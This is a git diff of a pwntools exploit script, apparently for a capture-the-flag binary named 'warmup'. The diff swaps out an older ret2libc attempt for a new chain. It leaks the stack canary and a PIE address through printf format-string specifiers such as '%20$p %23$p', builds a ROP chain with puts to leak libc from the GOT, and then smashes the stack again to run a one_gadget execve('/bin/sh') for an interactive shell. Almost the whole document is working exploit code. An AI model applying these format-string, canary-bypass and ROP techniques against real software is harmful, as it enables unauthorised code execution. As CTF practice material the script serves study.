@@ -24,18 +24,12 @@ Canary is always 4 or 8 bytes from bp
 Leak information for printf:
 https://libc.nullbyte.cat/?q=printf%3Afb0&l=libc6-x32_2.27-3ubuntu1.2_i386
 
-Did digging on stack with %7$p %8$p %9$p, showed that %9$p is a ptr!!
-    Address ends with c60
-    Function is 
-
-To find what func was did
-    ps -ef | grep "warmup"
-    r2 -Ad PID
-
 Use for leak the following order:
-    leak    base    canary
-    %9$p    $20$p   $23$p
-    printf  main    last 8 bytes
+    leak                    canary
+    $20$p                   $23$p
+    __libc_csu_init         last 8 bytes
+
+    used pwndbg and counted back to $20 to figure out address leaked
 '''
 
 # Import Libarries
@@ -44,79 +38,87 @@ from pwn import *
 # Variables
 padding=b'a'*72     # truley 80, last 8 bytes are the canary so
 padOverBP=b'c'*8    # Overwrite base pointer
-leakAddrStr=b"%18$p %23$p"
+leakAddrStr=b"%20$p %23$p"
 
 # Starting ELF
-elf = ELF("./libc.so.6",checksec=False)
-
-# start process and recieve leaked information
-p = process("./warmup")
-p.recv()
-p.sendline(leakAddrStr)     # Send to leak address
-leak = p.recvuntil(b" ")    # should be leak addr
-leakInt = int(leak,16)      # should be address of stdout
-canary = p.recvuntil(b"\n") # should be canary val
-canaryInt = int(canary,16)
-
-print("leak:", leak)
-print("canary:", canary)
-
-# Find offset to beginning of libc
-libcStart = leakInt - elf.sym.stdout + 200
-print("libc Start:",hex(libcStart))
-elf.address = libcStart
-
-# Other gadgets like ret and shell
-system = elf.symbols['system']
-bin_sh = next(elf.search(b'/bin/sh'))
-pop_rdi_ret = elf.address + 0x0000000000023b72 # 0x0000000000023b72 was his mine is same; found via ROPgadget --binary libc.so.6
-pop_rdi_ret2 = elf.address + 0x0000000000023b73 # 0x0000000000023b72 was his mine is same; found via ROPgadget --binary libc.so.6
-
-# Creating payload
-payload=padding+p64(canaryInt)+padOverBP+p64(pop_rdi_ret)+p64(pop_rdi_ret)+p64(bin_sh)+p64(system)+p64(elf.sym.exit)
-
-p.sendline(payload)
-p.interactive()
-'''
-# Get offset to set libc
-getToVbuff = -253      #offset at %19$p to ge to vbuff
-setvbuffOffset = "0x2f8d0"
-setvbuffOffsetInt = int(setvbuffOffset,16)
-
-# variables
-padding = b'a'*72 # truly 80, but the last 8 bytes are the canary, look at gets not fgets, 50h
-padOverBP = b'a'*8  # overwrite base pointer
-leakAddrStr = b"%19$p %23$p"
-
-# Starting ELF
+print("ESTABLISHING LIBC")
+libc = ELF("libc.so.6")
 elf = ELF("./warmup")
-libc = elf.libc
 
-# start process and recieve leaked information
+# Start Process and send printf
 p = process("./warmup")
-p.recv()
-p.sendline(leakAddrStr)     # Send to leak address
-leak = p.recvuntil(b" ")    # should be leak addr
-leakInt = int(leak,16)+getToVbuff       # should be address of vbuff
-canary = p.recvuntil(b"\n") # should be canary val
-canaryInt = int(canary,16)
-canaryInt = p64(canaryInt)
+p.sendline(leakAddrStr)
 
-print("leak:", leak)
-print("canary:", canary)
+# Parse and get leaks
+resp = p.recvuntil(b'\n')  # Should stop at canary
+print("RESPONSE: ", resp)      # Debugging the info it's pulling
 
-# Find offset to beginning of libc
-libcStart = leakInt - libc.sym.setvbuf
-print("libc Start:",hex(libcStart))
+# GOT Leak Found
+GOTLeak=p.recvuntil(b' ')
+print("GOT LEAK: ", GOTLeak)
+GOTLeakInt=int(GOTLeak,16)
 
-# Exploit time
-popRdiRet = p64(0x0000000000001343)
-binsh = p64(next(libc.search(b'/bin/sh\x00')))
-retgad = p64(0x000000000000101a)
-libsys = p64(libc.sym.system)
-payload = padding + canaryInt + padOverBP + popRdiRet + binsh + b'aaaaaaaa' + retgad + libsys
+# Canary Leak found
+canary=p.recvuntil(b'\n')
+print("CANARY: ", canary)
+canaryInt=int(canary,16)
 
-# send and find flag
+# Find PIE Base, libc base in the binary
+PIEBase = GOTLeakInt - elf.sym["__libc_csu_init"]
+
+# POP RDI Gadget
+# Ran ROPgadget --binary warmup to find pop rdi
+popRdiRet = PIEBase + 0x0000000000001343 # : pop rdi ; ret
+
+# Craft ROP
+payload = padding
+payload += p64(canaryInt)
+payload += padOverBP
+payload += p64(popRdiRet)   # 
+payload += p64(PIEBase + elf.got["gets"])   # Address to leak? or to call gets?
+payload += p64(PIEBase + elf.plt["puts"])   # Print out leak to find base of libc
+payload += p64(PIEBase + elf.symbols["main"])  # Cause the infinite loop to happen
+
+# Send payload then recieve
+p.sendline(payload)
+p.recvline()
+
+# Set up libc leak!
+libcLeak = u64(p.recvline().strip() + b"\x00\x00")      # Makes it into decimal number, unsigned, also is the address of gets whic his recieved
+print("LIBC LEAK: ",hex(libcLeak))
+
+# Calculate base
+libcBase = libcLeak - libc.symbols['gets']
+print("LIBC BASE:", hex(libcBase))
+
+# Just to clear first fgets
+p.sendlineafter(b"Can you help find the Canary ?", padOverBP)
+
+
+'''
+0xe3b2e execve("/bin/sh", r15, r12)
+constraints:
+  [r15] == NULL || r15 == NULL
+  [r12] == NULL || r12 == NULL
+
+0xe3b31 execve("/bin/sh", r15, rdx)
+constraints:
+  [r15] == NULL || r15 == NULL
+  [rdx] == NULL || rdx == NULL
+
+0xe3b34 execve("/bin/sh", rsi, rdx)
+constraints:
+  [rsi] == NULL || rsi == NULL
+  [rdx] == NULL || rdx == NULL
+'''
+# Stack smash and use one gadget to pop shell
+print("Sending Onegadget")
+onegadget=0xe3b2e
+payload = padding
+payload += p64(canaryInt)
+payload += padOverBP
+payload += p64(libcBase + onegadget) # 0xe3b31 0xe3b34    # One gadget to launch shell
+
+# Send and then interactive
 p.sendline(payload)
 p.interactive()
-'''
